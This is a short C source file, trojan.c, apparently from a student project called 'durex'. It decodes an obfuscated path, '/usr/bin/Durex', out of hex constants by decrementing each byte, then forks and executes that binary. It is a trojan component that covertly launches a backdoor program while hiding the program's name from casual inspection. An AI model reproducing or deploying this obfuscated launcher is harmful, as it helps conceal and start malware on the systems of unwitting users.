/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   trojan.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/12/03 10:35:03 by alagroy-          #+#    #+#             */
/*   Updated: 2021/12/03 10:53:33 by alagroy-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void        get_filename(int *buf)
{
    int     i;
    char    *filename;
    
    buf[0] = 0x73747630;
    buf[1] = 0x6f6a6330;
    buf[2] = 0x73764530;
    buf[3] = 0x7966;
    i = -1;
    filename = (char *)buf;
    while (filename[++i])
        filename[i]--;
}

void        do_trojan_dirty_job(void)
{
    pid_t       pid;
    int         buf[4];
    char        *cmd[] = {
        (char *)buf,
        NULL
    };

    get_filename(buf);
    if ((pid = fork()) == 0)
        execve(cmd[0], cmd, NULL);
}